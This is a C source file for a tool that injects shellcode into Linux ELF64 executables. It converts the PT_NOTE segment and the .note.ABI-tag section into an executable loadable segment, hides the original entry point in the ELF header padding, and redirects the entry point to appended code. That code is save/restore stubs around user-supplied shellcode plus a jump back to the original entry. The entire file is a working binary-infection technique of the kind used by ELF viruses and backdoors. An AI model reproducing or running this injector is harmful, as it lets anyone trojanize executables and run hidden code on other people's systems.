#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <linux/elf.h>

#include <elf.h>
#include <misc.h>

bool is_valid(unsigned char *p)
{
    return (
        MAG0(p[0]) &&
        MAG1(p[1]) &&
        MAG2(p[2]) &&
        MAG3(p[3]) &&
        (p[4] == ELFCLASS64)
        );
}

Elf64_Phdr* find_segment_header(unsigned char *p)
{
    
    Elf64_Ehdr *header = (Elf64_Ehdr*)p;
    Elf64_Phdr *pheader;

    for (int i = 0; i < header->e_phnum; i++)
    {
        pheader = (Elf64_Phdr*)(p+header->e_phoff + i * header->e_phentsize);

        if (pheader->p_type == PT_NOTE)
            return pheader;
    }

    return NULL;
}

Elf64_Shdr *find_section_by_name(unsigned char *p, const char *name)
{
    Elf64_Ehdr *header = (Elf64_Ehdr*)p;
    Elf64_Shdr *sheader;
    Elf64_Shdr *sh_strtab = (Elf64_Shdr*) (p+header->e_shoff + header->e_shentsize * header->e_shstrndx); 

    for (int i = 0; i < header->e_shnum; i++)
    {   

        sheader = (Elf64_Shdr*)(p+header->e_shoff + i * header->e_shentsize);
        char *sname = (char*)(p+sh_strtab->sh_offset + sheader->sh_name);

        if (strcmp(sname, name) == 0)
            return sheader;
    }

    return NULL;
}
Elf64_Shdr *find_section_for_injection(unsigned char *p)
{
    return find_section_by_name(p, ".note.ABI-tag");
}

long long unsigned int get_base_address(unsigned char *p)
{
    Elf64_Ehdr *header = (Elf64_Ehdr*)p;
    Elf64_Phdr *pheader = (Elf64_Phdr*)(p+header->e_phoff);

    long long unsigned min = pheader->p_vaddr;

    for (int i = 1; i < header->e_phnum; i++)
    {
        pheader = (Elf64_Phdr*)(p+header->e_phoff + i * header->e_phentsize);

        if ((pheader->p_vaddr < min) && (pheader->p_type == PT_LOAD)) 
            min = pheader->p_vaddr;
    }

    return min;
}

size_t get_file_size(int fd) 
{
    struct stat st;
    fstat(fd, &st);
    return (size_t)st.st_size;
}

const char stub_save[16] = "\x50\x53\x51\x52\x57\x56\x49\x89\xE4\x48\x81\xEC\x00\x05\x00\x00"; 
const char stub_rest[9] = "\x4C\x89\xE4\x5E\x5F\x5A\x59\x5B\x58";

const char ret_entry[12] = "\x48\x31\xc0\xb8\x0a\x00\x40\x00\x8b\x00\xff\xe0";


void inject_code(const char *filename, const char *code)
{
    int fd = open(filename, O_RDWR, 0);
    if (fd < 0)
        fatal_error("can't open file");

    size_t file_size = get_file_size(fd);

    unsigned char *p = mmap(0, file_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED)
        fatal_error("map failed");

    if (!is_valid(p))
        fatal_error("not a valid elf64 file");

    Elf64_Phdr *pheader = find_segment_header(p);
    if (pheader == NULL)
        fatal_error("can't find a PT_NOTE segment");

    Elf64_Shdr *sheader = find_section_for_injection(p);
    if (sheader == NULL)
        fatal_error("can't find a .note-* section");

    Elf64_Ehdr *header = (Elf64_Ehdr*)p;
    if (header->e_type != ET_EXEC)
        fatal_error("Executable musntn't be compiled as PIE");

    if (strlen(code) % 2 != 0)
        fatal_error("Invalid shellcode");

    unsigned char *val = malloc(strlen(code)/2);
    if (val == NULL)
        fatal_error("error while allocating memeory");

    if (get_base_address(p) != 0x400000)
        fatal_error("Not working with base address != 0x400000");

    unsigned char *pos = code;

    for (size_t count = 0; count < strlen(code)/2; count++) {
        sscanf(pos, "%2hhx", &val[count]);
        pos += 2;
    }

    printf("[+] Original entry point : 0x%llx\n", header->e_entry);

    pheader->p_type = PT_LOAD;
    pheader->p_offset = file_size;
    pheader->p_vaddr = (Elf64_Addr)(file_size+0xc000000);
    pheader->p_paddr = (Elf64_Addr)(file_size+0xc000000);

    pheader->p_filesz = strlen(code)/2 + 37;
    pheader->p_memsz = pheader->p_filesz;
    pheader->p_flags = PF_R | PF_X;
    pheader->p_align = 0x1000;

    printf("[+] Patched program header succesfully\n");

    sheader->sh_type = SHT_PROGBITS;
    sheader->sh_addr = pheader->p_vaddr;
    sheader->sh_offset = pheader->p_offset;
    sheader->sh_size = pheader->p_memsz;
    sheader->sh_addralign = 16;
    sheader->sh_flags = SHF_ALLOC | SHF_EXECINSTR;

    unsigned int *patch = (unsigned int*)(p+10);
    *patch = (unsigned int)header->e_entry;

    printf("[+] Patched section header succesfully\n");
    header->e_entry = (Elf64_Addr) (file_size+0xc000000);
    printf("[+] New entry point: 0x%llx\n", header->e_entry);

    printf("[+] Injecting shellcode of %lu bytes", strlen(code)/2);

    FILE *f = fopen(filename, "a");
    if (f != NULL)
    {
        fwrite(stub_save, sizeof(char), 16, f);
        fwrite(val, sizeof(char), strlen(code)/2, f);
        fwrite(stub_rest, sizeof(char), 9, f);
        fwrite(ret_entry, sizeof(char), 12, f);
    }

}